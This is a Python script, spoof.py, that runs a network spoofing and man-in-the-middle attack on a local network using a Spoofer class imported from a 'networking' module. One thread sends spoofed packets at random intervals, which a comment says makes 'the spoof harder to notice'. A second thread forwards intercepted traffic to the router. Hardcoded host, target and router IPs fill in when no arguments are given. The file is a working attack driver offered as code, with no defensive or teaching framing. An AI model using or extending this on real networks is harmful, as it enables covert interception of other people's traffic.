"""
this file's purpose is:
the server should activate this script in a distinct process,
and than kills it, when shutting down.
"""


DEBUG = False

import threading
import sys
import signal
import time
import random

from networking import Spoofer

if (len(sys.argv) != 4):
    # print(f"Wrong usage. Usage- spoof.py <host_ip> <target_ip> <router_ip> and not {sys.argv}")
    # sys.exit(0)
    sys.argv = ["spoof.py", "192.168.1.128","192.168.1.106","192.168.1.1"]


class Spoof():
    def __init__(self) -> None:
        self.__spoof_obj : Spoofer = Spoofer(*sys.argv[1:])
        # Setup signal handler function as the signal function.
        signal.signal(signal.SIGTERM,self.signal_handler)

    def signal_handler(self,sig,frame):
        print("Shutting down gracfully")
        if DEBUG:
            pass
        else:
            self.__spoof_obj.checkout()
        sys.exit(0)


    def spoof(self):
        if DEBUG:
            while True:
                print("Sent spoofing packet.... (not really)")
                time.sleep(1)
        else:
            while True:
                self.__spoof_obj.send_spoofed_packet()
                time.sleep(random.random()/10) # wait a random number between 0-0.1
                # The time.sleep has 2 jobs -
                #   first, make the spoof harder to notice.
                #   second, the terminating signal can only be received if the process is waiting, and not running.
                #       thus, without the time the signal wouldn't be registered.

    def MITM(self):
        self.__spoof_obj.forward_to_router()

def debug_main():
    spoofer = Spoof()
    spoofer.spoof()


def main():
    spoofer = Spoof()
    spoof_t: threading.Thread = threading.Thread(target=spoofer.spoof)
    MITM_t: threading.Thread = threading.Thread(target=spoofer.MITM)

    spoof_t.start()
    MITM_t.start()
    # Run in the background.


if __name__ == "__main__":
    if DEBUG:
        print("Running spoof.py on debug mode.")
        debug_main()
    else:
        main()

